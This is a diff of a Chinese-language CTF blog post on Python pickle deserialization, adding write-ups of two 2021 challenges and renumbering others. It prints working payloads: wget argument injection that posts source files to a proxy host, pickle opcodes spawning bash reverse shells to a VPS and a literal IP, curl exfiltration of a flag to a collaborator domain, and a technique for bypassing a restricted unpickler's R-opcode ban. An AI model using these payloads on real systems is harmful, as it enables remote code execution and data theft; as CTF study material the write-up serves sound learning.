@@ -556,13 +556,144 @@ return ticket
 ```
 {{% /spoiler %}}
 
+
+
+{{% spoiler "栗子3 - [巅峰极客 2021]what_pickle" %}}
+
+登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现
+
+/images可以看到开着的debug界面
+
+![image-20211024174438862](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png)
+
+能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来
+
+```
+/images?image=&argv=--post-file=/app/app.py&argv=--execute=http_proxy=http://ip:port
+```
+
+```
+/images?image=&argv=—post-file=/app/app.py&argv=-e http_proxy=http://ip:port
+```
+
+依次读出/app/app.py和/app/config.py
+
+```python
+# app.py
+from flask import Flask, request, session, render_template, url_for,redirect
+import pickle
+import io
+import sys
+import base64
+import random
+import subprocess
+from ctypes import cdll
+from config import SECRET_KEY, notadmin,user
+
+cdll.LoadLibrary("./readflag.so")
+
+app = Flask(__name__)
+app.config.update(dict(
+    SECRET_KEY=SECRET_KEY,
+))
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if module in ['config'] and "__" not in name:
+            return getattr(sys.modules[module], name)
+        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
+
+
+def restricted_loads(s):
+    """Helper function analogous to pickle.loads()."""
+    return RestrictedUnpickler(io.BytesIO(s)).load()
+
+
+@app.route('/')
+@app.route('/index')
+def index():
+    if session.get('username', None):
+        return redirect(url_for('home'))
+    else:
+        return render_template('index.html')
+
+@app.route('/login', methods=["POST"])
+def login():
+    name = request.form.get('username', '')
+    data = request.form.get('data', 'test')
+    User = user(name,data)
+    session["info"]=base64.b64encode(pickle.dumps(User))
+    return redirect(url_for('home'))
+
+@app.route('/home')
+def home():
+    info = session["info"]
+    User = restricted_loads(base64.b64decode(info))
+    Jpg_id = random.randint(1,5)
+    return render_template('home.html',id = str(Jpg_id), info = User.data)
+
+
+@app.route('/images')
+def images():
+    command=["wget"]
+    argv=request.args.getlist('argv')
+    true_argv=[x if x.startswith("-") else '--'+x for x in argv]
+    image=request.args['image']
+    command.extend(true_argv)
+    command.extend(["-q","-O","-"])
+    command.append("http://127.0.0.1:8080/"+image)
+    image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    return image_data.stdout
+
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=True, port=80)
+```
+
+```python
+# config.py
+SECRET_KEY="On_You_fffffinddddd_thi3_kkkkkkeeEEy"
+
+notadmin={"admin":"no"}
+
+class user():
+    def __init__(self, username, data):
+        self.username = username
+        self.data = data
+
+def backdoor(cmd):
+    if isinstance(cmd,list) and notadmin["admin"]=="yes":
+        s=''.join(cmd)
+        eval(s)
+```
+
+这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数`eval()`
+
+```python
+# 用pker.py生成payload
+s=GLOBAL("config","notadmin")
+s["admin"]="yes"
+user=INST("config","user")
+user.username="tyskill"
+user.data="tyskill"
+door=INST("config","backdoor",["__import__('subprocess').call(\"echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/you_vps_ip/port 0>&1'>x && bash x && rm -rf x\",shell=True)"])
+return user
+```
+
+然后`base64.b64encode(data)`加进`session['info']`中拿到shell
+
+看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp->[wp1](https://juejin.cn/post/6994717395298287624)  |  [wp2](https://ctf.njupt.edu.cn/663.html#what_pickle)
+
+{{% /spoiler %}}
+
 ### -->>仅可以引入`builtins`模块
 
 ![img](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png)
 
 更多知识参考：[深入理解Python中的`__builtin__`和`__builtins__`](https://blog.51cto.com/xpleaf/1764849)  |  [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f)  |  [`__builtins__` 与 `__builtin__`（builtins）](https://zhuanlan.zhihu.com/p/125693125)
 
-{{% spoiler "栗子3 - [Code-Breaking 2018] picklecode" %}}
+{{% spoiler "栗子4 - [Code-Breaking 2018] picklecode" %}}
 本地复现还是失败，docker地址->https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了
 
 审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app
@@ -689,7 +820,7 @@ return
 
 ### -->>仅可以引入`sys`模块&名字中不带`.`点号
 
-{{% spoiler "栗子4 - [BalsnCTF 2019] Pyshv1" %}}
+{{% spoiler "栗子5 - [BalsnCTF 2019] Pyshv1" %}}
 题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1
 
 审计一下源码，先看一下肯定会不secure的securePickle.oy
@@ -730,7 +861,7 @@ b"csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'
 
 ### -->>仅可以引入题目中自设空模块
 
-{{% spoiler "栗子5 - [BalsnCTF 2019] Pyshv2" %}}
+{{% spoiler "栗子6 - [BalsnCTF 2019] Pyshv2" %}}
 题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2
 
 `find_class()`稍有区别，在`getattr()`之前先用了`__import__()`
@@ -778,7 +909,7 @@ b"cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute
 
 ### -->>变量覆盖
 
-{{% spoiler "[高校战“疫”网络安全分享赛2020] webtmp" %}}
+{{% spoiler "栗子7 - [高校战“疫”网络安全分享赛2020] webtmp" %}}
 （这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了`R`操作码，同时重写`find_class()`限制引入模块为`__main__`，两个考点）
 
 ```python
@@ -1016,6 +1147,83 @@ payload = exploit([
 ])
 ```
 
+{{% spoiler "栗子8 - [巅峰极客 2021]opcode" %}}
+
+首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码
+
+![image-20211024145247073](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png)
+
+第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的`session['data']`处
+
+但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法<u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写`pickle.loads`方法，只是个摆设</u>，相当于仅对R操作码进行了限制，笑嘻了
+
+直接上`eval()`+`b'o'`来弹shell了，不多bb
+
+```python
+(cbuiltins
+eval
+S'__import__("os").system(\'bash -c "bash -i >& /dev/tcp/101.35.113.107/8426 0&1"\')'
+o.
+```
+
+或者是用`system()`+`curl`+`b'o'`外带flag
+
+```python
+(cos
+system
+S'curl burp_collaborator.net/?flag=`app/readflag`'
+o.
+```
+
+然后生成b64的内容（用`'''`的好处是不用考虑太多引号转义的问题
+
+```python
+import base64
+data = b'''xxxxxxxxxxxxxx'''
+print(base64.b64encode(data))
+```
+
+cookie的生成就是flask_session_cookie_manager一把梭了
+
+```bash
+$ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{"data": "xxxxb64_contentxxxx", "username": "adminadmin"}' 
+```
+
+————如果按照题目原有的意思，限制`builtins`+`b'R'`操作码也是很好做出来的
+
+先用pker生成带R的opcode
+
+```python
+getattr = GLOBAL('builtins', 'getattr')
+dict = GLOBAL('builtins', 'dict')
+dict_get = getattr(dict, 'get')
+globals = GLOBAL('builtins', 'globals')
+builtins = globals()
+__builtins__ = dict_get(builtins, '__builtins__')
+eval = getattr(__builtins__, 'eval')
+eval('__import__("os").system("whoami")')
+return
+# b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
+```
+
+然后手搓，在调用callable前添加MARK即`(`，去掉`t`和调用`t`用到的MARK
+
+也就是`[callable] [tuple] R===>MARK [callable] [args...] o`
+
+```
+b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__("os").system("whoami")'\no.'''
+```
+
+可以看下区别
+
+![image-20211024165337816](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png)
+
+修改都是一对一对的，**总结一下方法就是`0gx`要变为`0(gx`，`(gx`要变为`gx` ，`tR`换成`o`**
+
+参考：[wp](https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6)
+
+{{% /spoiler %}}
+
 ### -->>使用`_getattribute()`&`load_obj()`&`load_inst()`实现任意文件读取
 
 - `find_class()`
@@ -1191,7 +1399,7 @@ os.system('curl -d '@/flag.txt' http://xxxx.burpcollaborator.net/)
       main()
   ```
 
-{{% spoiler "栗子7 - [BalsnCTF 2019] Pyshv3" %}}
+{{% spoiler "栗子9 - [BalsnCTF 2019] Pyshv3" %}}
 这次的find_class()没有变化，但是structs有具体的实现
 
 ![image-20210812012841569](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png)
